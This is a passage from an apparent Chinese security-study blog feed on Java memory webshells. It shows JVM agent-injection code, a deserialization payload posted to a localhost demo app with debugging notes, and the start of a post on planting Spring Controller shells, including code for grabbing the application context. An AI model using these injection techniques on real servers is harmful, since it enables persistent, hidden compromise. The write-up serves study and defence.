class="hljs-variable">path</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;D:\\JavaCode\\内存马\\AgentMem\\Demo02\\target\\Demo02-1.0-SNAPSHOT.jar&quot;</span>;<br>            java.io.<span class="hljs-type">File</span> <span class="hljs-variable">toolsPath</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.File(System.getProperty(<span class="hljs-string">&quot;java.home&quot;</span>).replace(<span class="hljs-string">&quot;jre&quot;</span>,<span class="hljs-string">&quot;lib&quot;</span>) + java.io.File.separator + <span class="hljs-string">&quot;tools.jar&quot;</span>);<br>            java.net.<span class="hljs-type">URL</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> toolsPath.toURI().toURL();<br>            java.net.<span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">classLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URLClassLoader(<span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.net.URL[]&#123;url&#125;);<br>            Class<span class="hljs-comment">/*&lt;?&gt;*/</span> MyVirtualMachine = classLoader.loadClass(<span class="hljs-string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);<br>            Class<span class="hljs-comment">/*&lt;?&gt;*/</span> MyVirtualMachineDescriptor = classLoader.loadClass(<span class="hljs-string">&quot;com.sun.tools.attach.VirtualMachineDescriptor&quot;</span>);<br>            java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">listMethod</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;list&quot;</span>,<span class="hljs-literal">null</span>);<br>            java.util.List<span class="hljs-comment">/*&lt;Object&gt;*/</span> list = (java.util.List<span class="hljs-comment">/*&lt;Object&gt;*/</span>) listMethod.invoke(MyVirtualMachine,<span class="hljs-literal">null</span>);<br><br>            System.out.println(<span class="hljs-string">&quot;Running JVM list ...&quot;</span>);<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;list.size();i++)&#123;<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> list.get(i);<br>                java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">displayName</span> <span class="hljs-operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="hljs-string">&quot;displayName&quot;</span>,<span class="hljs-literal">null</span>);<br>                java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> (java.lang.String) displayName.invoke(o,<span class="hljs-literal">null</span>);<br>                <span class="hljs-comment">// 列出当前有哪些 JVM 进程在运行</span><br>                <span class="hljs-comment">// 这里的 if 条件根据实际情况进行更改</span><br>                <span class="hljs-keyword">if</span> (name.contains(<span class="hljs-string">&quot;com.src.Demo02EnvApplication&quot;</span>))&#123;<br>                    <span class="hljs-comment">// 获取对应进程的 pid 号</span><br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">getId</span> <span class="hljs-operator">=</span> MyVirtualMachineDescriptor.getDeclaredMethod(<span class="hljs-string">&quot;id&quot;</span>,<span class="hljs-literal">null</span>);<br>                    java.lang.<span class="hljs-type">String</span> <span class="hljs-variable">id</span> <span class="hljs-operator">=</span> (java.lang.String) getId.invoke(o,<span class="hljs-literal">null</span>);<br>                    System.out.println(<span class="hljs-string">&quot;id &gt;&gt;&gt; &quot;</span> + id);<br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">attach</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;attach&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;java.lang.String.class&#125;);<br>                    java.lang.<span class="hljs-type">Object</span> <span class="hljs-variable">vm</span> <span class="hljs-operator">=</span> attach.invoke(o,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;id&#125;);<br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">loadAgent</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;loadAgent&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;java.lang.String.class&#125;);<br>                    loadAgent.invoke(vm,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;path&#125;);<br>                    java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">detach</span> <span class="hljs-operator">=</span> MyVirtualMachine.getDeclaredMethod(<span class="hljs-string">&quot;detach&quot;</span>,<span class="hljs-literal">null</span>);<br>                    detach.invoke(vm,<span class="hljs-literal">null</span>);<br>                    System.out.println(<span class="hljs-string">&quot;Agent.jar Inject Success !!&quot;</span>);<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Test</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> 用 <strong>java-chains</strong> , 把 <code>Test.class</code> 注入到 <code>TemplatesImpl</code> 的 <code>_bytecodes</code>，生成了 <code>JavaNativePayload_…txt</code> 文件。  </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525081.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525372.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081523154.png" alt="img"></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">curl -v <span class="hljs-string">&quot;http://localhost:8089/cc&quot;</span> --data-<span class="hljs-built_in">binary</span> <span class="hljs-symbol">@test</span>.ser<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081525511.png" alt="img"></p><ol><li>内存马注入情况</li></ol><p>从日志来看：</p><p>Running JVM list …</p><p>id &gt;&gt;&gt; 40008</p><p>Find the Inject Class: org.apache.catalina.core.ApplicationFilterChain</p><p>Agent.jar Inject Success !!</p><p>使用的 Demo02-1.0-SNAPSHOT.jar 成功 attach 到了目标 JVM（PID 40008）。</p><p>org.apache.catalina.core.ApplicationFilterChain 作为 hook 入口已经被找到。</p><p>也就是说，内存马的 Agent 部分已经成功加载到 JVM。</p><p>所以注入是成功的，这部分没有问题</p><p>1. </p><p> curl 请求触发了 POST &#x2F;cc，但是返回：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">java.lang.NullPointerException: <span class="hljs-literal">null</span><br>at com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.postInitialization(AbstractTranslet.java:<span class="hljs-number">372</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getTransletInstance(TemplatesImpl.java:<span class="hljs-number">456</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>at com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.newTransformer(TemplatesImpl.java:<span class="hljs-number">486</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>at com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter.&lt;init&gt;(TrAXFilter.java:<span class="hljs-number">64</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:<span class="hljs-number">62</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:<span class="hljs-number">45</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br>at java.lang.reflect.Constructor.newInstance(Constructor.java:<span class="hljs-number">422</span>) ~[na:<span class="hljs-number">1.8</span><span class="hljs-number">.0_65</span>]<br></code></pre></td></tr></table></figure><p>分析原因：</p><p>你上传的 payload 是基于 CommonsCollections K3 + TemplatesImpl 的序列化。</p><p>错误发生在 TemplatesImpl 初始化阶段的 postInitialization 方法：</p><p>NullPointerException 一般是因为 TemplatesImpl 中 _bytecodes 或 _name 等字段为 null。</p><p>也就是说  test.ser 文件中，<strong>TemplatesImpl 对象没有正确填充字节码</strong>….</p><p>为什么生成的时候没有写进去呢？</p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><p><a href="https://www.cnblogs.com/rebeyond/p/9686213.html">【原创】利用“进程注入”实现无文件不死webshell</a></p><p><a href="https://goodapple.top/archives/1355">Java安全学习——内存马 - 枫のBlog</a></p><p><a href="http://101.36.122.13:4000/2025/08/06/Spring%E5%86%85%E5%AD%98%E9%A9%AC/#J9TFY">Spring内存马 | CurlySean’s Blog</a></p><p><a href="https://y4er.com/posts/javaagent-tomcat-memshell/#%E7%AE%80%E8%BF%B0%E5%86%85%E5%AD%98shell">Java Agent实现反序列化注入内存shell</a></p><p><a href="https://su18.org/post/memory-shell/">JavaWeb 内存马一周目通关攻略 | 素十八</a></p><p><a href="https://su18.org/post/memory-shell-2/">JavaWeb 内存马二周目通关攻略 | 素十八</a></p><p><a href="https://www.4hou.com/posts/zlkq">Shell中的幽灵王者—JAVAWEB 内存马 【认知篇】 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com</a></p><p><a href="https://www.freebuf.com/articles/web/433972.html">Java内存马——Tomcat Valve型的三种注入 - FreeBuf网络安全行业门户</a></p><p><a href="https://hilang.cloud/java-%E5%86%85%E5%AD%98%E9%A9%AC%EF%BC%88%E5%9B%9B%EF%BC%89%EF%BC%9Aspring-boot-controller-%E5%86%85%E5%AD%98%E9%A9%AC/">Java 内存马（四）：Spring Boot Controller 内存马 | 渐怀的博客</a></p><p><a href="https://stoocea.github.io/post/Spring%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90.html#2-Controller-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC">Spring型内存马分析</a></p><p><a href="https://www.runoob.com/servlet/servlet-intro.html">Servlet 简介 | 菜鸟教程</a></p><p><a href="https://clowsman.github.io/2024/11/13/Spring%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/index.html">Spring内存马学习</a></p><p><a href="https://xz.aliyun.com/news/11493">Spring内存马——Controller&#x2F;Interceptor构造</a></p><p>[基础篇 - Javassist 使用指南](<a href="https://changeyourway.github.io/2024/06/07/Java">https://changeyourway.github.io/2024/06/07/Java</a> 安全&#x2F;基础篇-javassist用法指南&#x2F;)</p><p><a href="https://goodapple.top/archives/1145#header-id-20">Java安全学习——ROME反序列化 - 枫のBlog</a> （使用Javassist缩短恶意class）</p><p><a href="https://y4er.com/posts/javaagent-tomcat-memshell/">Java Agent实现反序列化注入内存shell</a></p><p><a href="http://101.36.122.13:4000/2025/08/05/JavaAgent%E5%86%85%E5%AD%98%E9%A9%AC">Agent内存马 | CurlySean’s Blog</a></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>内存马</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java 内存马第三篇 - Spring 内存马</title>
    <link href="/2025/11/08/Java%20%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E4%B8%89%E7%AF%87%20-%20Spring%20%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <url>/2025/11/08/Java%20%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E4%B8%89%E7%AF%87%20-%20Spring%20%E5%86%85%E5%AD%98%E9%A9%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-内存马第三篇-Spring-内存马"><a href="#Java-内存马第三篇-Spring-内存马" class="headerlink" title="Java 内存马第三篇 - Spring 内存马"></a>Java 内存马第三篇 - Spring 内存马</h1><h1 id="三、Spring-内存马"><a href="#三、Spring-内存马" class="headerlink" title="三、Spring 内存马"></a>三、Spring 内存马</h1><h2 id="1、Controller-内存马"><a href="#1、Controller-内存马" class="headerlink" title="1、Controller 内存马"></a>1、Controller 内存马</h2><h3 id="一些基础知识："><a href="#一些基础知识：" class="headerlink" title="一些基础知识："></a>一些基础知识：</h3><h4 id="Bean"><a href="#Bean" class="headerlink" title="Bean"></a>Bean</h4><p><code>Bean</code> 是 Spring 框架的一个<strong>核心概念</strong>，它是构成应用程序的主干，并且是由 <code>Spring IoC</code> 容器负责实例化、配置、组装和管理的对象。</p><ul><li>bean 是对象</li><li>bean 被 IoC 容器管理</li><li>Spring 应用主要是由一个个的 bean 构成的</li></ul><h4 id="IOC容器"><a href="#IOC容器" class="headerlink" title="IOC容器"></a>IOC容器</h4><p>如果一个系统有大量的组件（类），其生命周期和相互之间的依赖关系如果由组件自身来维护，不但大大增加了系统的复杂度，而且会导致组件之间极为紧密的耦合，继而给测试和维护带来了极大的困难。解决这一问题的核心方案就是IoC（又称为依赖注入）。由IoC负责创建组件、根据依赖关系组装组件、按依赖顺序正确销毁组件。</p><p>IOC容器通过读取配置元数据来获取对象的实例化、配置和组装的描述信息。配置的零元数据可以用<code>xml</code>、<code>Java注解</code>或<code>Java代码</code>来表示。</p><h4 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h4><p>Spring 框架中，<code>BeanFactory</code> 接口是 <code>Spring</code> <strong>IoC容器</strong> 的实际代表者</p><p>Spring容器就是ApplicationContext，它是一个接口继承于BeanFactory，有很多实现类。获得了ApplicationContext的实例，就获得了IoC容器的引用。我们可以从ApplicationContext中可以根据Bean的ID获取Bean。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518532.png" alt="img"></p><p>因此，<code>org.springframework.context.ApplicationContext</code>接口也代表了 <code>IoC容器</code> ，它负责实例化、定位、配置应用程序中的对象(<code>bean</code>)及建立这些对象间(<code>beans</code>)的依赖。</p><h3 id="1-1-Controller-创建"><a href="#1-1-Controller-创建" class="headerlink" title="1.1 Controller 创建"></a>1.1 Controller 创建</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519388.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519690.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519797.png" alt="img"></p><p>SpringController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.src.springmem.demos.web;<br><br><span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;<br><br><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SpringController</span> &#123;<br><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-meta">@RequestMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello world&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518537.png" alt="img"></p><h3 id="1-2-Controller-注册流程"><a href="#1-2-Controller-注册流程" class="headerlink" title="1.2 Controller 注册流程"></a>1.2 Controller 注册流程</h3><p>之前学习的 servlet、filter、listener 等都是通过访问特定路由来访问上传的内存马，那么在 Spring 中直观体现路由逻辑的就是 Controller。</p><p><strong>核心请求链路:</strong></p><p>当访问 <code>http://127.0.0.1:8098/hello</code> 时，请求经过以下关键步骤：</p><ol><li>Servlet 容器层：请求先经过 Tomcat 内置容器的 Filter 链（如 <code>WsFilter</code>、<code>RequestContextFilter</code>）</li><li>Spring MVC 入口：进入 <code>DispatcherServlet</code>（Spring MVC 核心前端控制器）</li><li>请求分发：<code>DispatcherServlet.doDispatch()</code> 方法负责请求分发，核心逻辑是「找到匹配的 Controller 方法」</li><li>Handler 映射：通过 <code>getHandler()</code> 方法遍历 <code>handlerMappings</code> 列表，找到能处理 <code>/index</code> 路径的映射器</li><li>方法执行：调用匹配的 Controller 方法（<code>MyController.index()</code>），返回响应结果</li></ol><p>断点调试，分析 Controller 的注册流程</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518563.png" alt="img"></p><p><code>doDispatch</code> 函数通常出现在基于 Spring MVC 框架的 Java Web 应用程序中，它是 <code>DispatcherServlet</code> 类的一个方法。<code>DispatcherServlet</code> 是 Spring MVC 中的核心控制器（前端控制器），负责接收所有的 HTTP 请求，并根据请求映射（通常是通过注解或 XML 配置）来决定应该调用哪个控制器（Controller）来处理这个请求。<br>具体来说，<code>doDispatch</code> 方法的主要职责包括：</p><ol><li><strong>解析请求</strong>：从传入的 HTTP 请求中提取必要的信息，比如请求路径、请求方法等。</li><li><strong>查找处理器</strong>：使用处理器映射（HandlerMapping）机制来找到能够处理当前请求的处理器对象（即 Controller 中的方法）。这一步骤涉及将 URL 路径与已注册的处理器进行匹配。</li><li><strong>创建处理器适配器</strong>：一旦找到了合适的处理器，就会通过处理器适配器（HandlerAdapter）来调用该处理器。处理器适配器负责执行具体的控制逻辑，并返回一个模型视图对象（ModelAndView）。</li><li><strong>渲染响应</strong>：基于处理器返回的模型视图对象，选择合适的视图解析器（ViewResolver）来生成最终的响应内容。这可能涉及到从数据库获取数据、调用业务逻辑服务等操作。</li><li><strong>处理异常</strong>：如果在上述过程中发生任何异常，<code>doDispatch</code> 也会负责捕获这些异常并通过适当的异常解析器（ExceptionResolver）来处理它们，确保应用程序能够优雅地应对错误情况并给客户端返回有意义的信息。</li></ol><p>总之，<code>doDispatch</code> 在 Spring MVC 的工作流程中扮演了极其重要的角色，它协调了从接收到请求到产生响应的整个过程，是实现松耦合且可扩展Web应用的关键部分之一。</p><p>我们从 doDispatch 开始看</p><p>访问 &#x2F;hello 路由时，首先要进入到 getHandler()</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518762.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519846.png" alt="img"></p><p>getHandler() 中有一个 HandlerMappings，HandlerMappings 中存在 5 个HandlerMapping ,</p><p>通过这五个来确定当前请求的处理程序</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518317.png" alt="img"></p><p>&#x2F;&#x2F;Determine handler adapter for the current request.确定当前请求的处理程序适配器。</p><p>HandlerAdapter ha &#x3D; getHandlerAdapter(mappedHandler.getHandler());</p><p>通过 <code>HandlerMapping</code> 找到 <code>Handler</code>，<code>**getHandlerAdapter(mappedHandler.getHandler())**</code> <strong>：根据找到的</strong><code>**Handler**</code><strong>的类型，找到能处理它的</strong> <code>**HandlerAdapter**</code><strong>。</strong></p><p>在这一过程中，选择了适配器进行处理</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519676.png" alt="img"></p><p>继续往下，这一步时实际处理 handler 的</p><p>&#x2F;&#x2F;Actually invoke the handler.</p><p>mv &#x3D; ha.handle(processedRequest, response, mappedHandler.getHandler());</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519550.png" alt="img"></p><p><strong>现在需要返回到 mappedHandler &#x3D; getHandler(processedRequest);</strong><br>在这一步中，会进入 getHandler() </p><p>​</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518045.png" alt="img"></p><p>最终会来到： getHandlerInternal() 方法</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518054.png" alt="img"></p><p>而其中的 mappingRegistry 中存放着我们的路由信息</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519356.png" alt="img"></p><p>这里首先对<code>mappingRegistry</code>进行上锁，最后在 finally 块中，进行解锁，</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518642.png" alt="img"></p><p>在 lookupPath 中获取了我们访问的路由</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518920.png" alt="img"></p><p><strong>接下来分析一下它的注册流程：</strong></p><p>在 AbstractHandlerMethodMapping.initHandlerMethods 处下断点调试</p><p>initHandlerMethods 方法扫描 ApplicationContext 中的 bean，检测和注册处理程序方法</p><p>使用<code>processCandidateBean</code>方法中来处理bean</p><p>断点要让他运行直到获得我们需要的 SpringController</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518356.png" alt="img"></p><p>进入 processCandidateBean 方法</p><p>首先通过 getType() 获取到了 beanType</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520106.png" alt="img"></p><p>判断该Bean是否为<code>Handler</code>对象，如果是的话，就将其传入<code>detectHandlerMethods</code>方法中</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518461.png" alt="img"></p><p>getUserClass  获取类名</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520959.png" alt="img"></p><p>获取方法名</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081520985.png" alt="img"></p><p>registerHandlerMethod 执行注册操作</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518416.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518826.png" alt="img"></p><h3 id="1-3-内存马编写"><a href="#1-3-内存马编写" class="headerlink" title="1.3 内存马编写"></a>1.3 内存马编写</h3><h4 id="1-3-1-获取上下文"><a href="#1-3-1-获取上下文" class="headerlink" title="1.3.1 获取上下文"></a>1.3.1 获取上下文</h4><p>对于内存马的注入，最重要的事情就是获取上下文，在Tomcat中获取说的上下文为<code>StandardContext</code>，对于Spring获取的就是<code>WebApplicationContext</code>。</p><p>五种方法：</p><ol><li>ContextLoader</li><li>WebApplicationContextUtils</li><li>RequestContextUtils</li><li>getAttribute</li><li>反射获取</li></ol><h5 id="ContextLoader"><a href="#ContextLoader" class="headerlink" title="ContextLoader"></a><strong>ContextLoader</strong></h5><p><code>getCurrentWebApplicationContext</code> 获得的是一个 <code>XmlWebApplicationContext</code> 实例类型的 <code>Root WebApplicationContext</code>。  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> ContextLoader.getCurrentWebApplicationContext();<br></code></pre></td></tr></table></figure><h5 id="WebApplicationContextUtils"><a href="#WebApplicationContextUtils" class="headerlink" title="WebApplicationContextUtils"></a>WebApplicationContextUtils</h5><p>通过这种方法获得的也是一个 <code>Root WebApplicationContext</code>。其中 <code>WebApplicationContextUtils.getWebApplicationContext</code> 函数也可以用 <code>WebApplicationContextUtils.getRequiredWebApplicationContext</code>来替换。  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());<br></code></pre></td></tr></table></figure><h5 id="RequestContextUtils"><a href="#RequestContextUtils" class="headerlink" title="RequestContextUtils"></a><strong>RequestContextUtils</strong></h5><p>通过 <code>ServletRequest</code> 类的实例来获得 <code>Child WebApplicationContext</code>。  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());<br></code></pre></td></tr></table></figure><h5 id="getAttribute"><a href="#getAttribute" class="headerlink" title="getAttribute"></a><strong>getAttribute</strong></h5><p> 这种方式与前几种的思路就不太一样了，因为所有的Context在创建后，都会被作为一个属性添加到了ServletContext中。所以通过直接获得ServletContext通过属性Context拿到 Child WebApplicationContext  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h5 id="反射获取"><a href="#反射获取" class="headerlink" title="反射获取"></a>反射获取</h5><p> 还可以通过反射获取<code>LiveBeansView</code>类的<code>applicationContexts</code> 属性来获取上下文。  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 1. 反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性</span><br>java.lang.reflect.<span class="hljs-type">Field</span> <span class="hljs-variable">filed</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;org.springframework.context.support.LiveBeansView&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;applicationContexts&quot;</span>);<br><span class="hljs-comment">// 2. 属性被 private 修饰，所以 setAccessible true</span><br>filed.setAccessible(<span class="hljs-literal">true</span>);<br><span class="hljs-comment">// 3. 获取一个 ApplicationContext 实例</span><br>org.springframework.web.context.<span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span>(org.springframework.web.context.WebApplicationContext) ((java.util.LinkedHashSet)filed.get(<span class="hljs-literal">null</span>)).iterator().next();<br></code></pre></td></tr></table></figure><p><code>org.springframework.context.support.LiveBeansView</code> 类在 <code>spring-context</code> 3.2.x 版本（现在最新版本是 5.3.x）才加入其中，所以比较低版本的 spring 无法通过此方法获得 <code>ApplicationContext</code> 的实例。  </p><h4 id="1-3-2-注册-Controller"><a href="#1-3-2-注册-Controller" class="headerlink" title="1.3.2 注册 Controller"></a>1.3.2 注册 Controller</h4><p>Spring Controller 的动态注册，就是对 <code>RequestMappingHandlerMapping</code> 注入的过程。</p><p>Spring 2.5 开始到 Spring 3.1 之前一般使用<br><code>org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping</code><br>映射器 ；</p><p>Spring 3.1 开始及以后一般开始使用新的<br><code>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</code>映射器来支持@Contoller和@RequestMapping注解。</p><p>三种方法：</p><ol><li>registerMapping</li><li>registerHandler</li><li>detectHandlerMethods</li></ol><h5 id="registerMapping"><a href="#registerMapping" class="headerlink" title="registerMapping"></a>registerMapping</h5><p> 在Spring 4.0及以后，可以使用registerMapping直接注册requestMapping  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 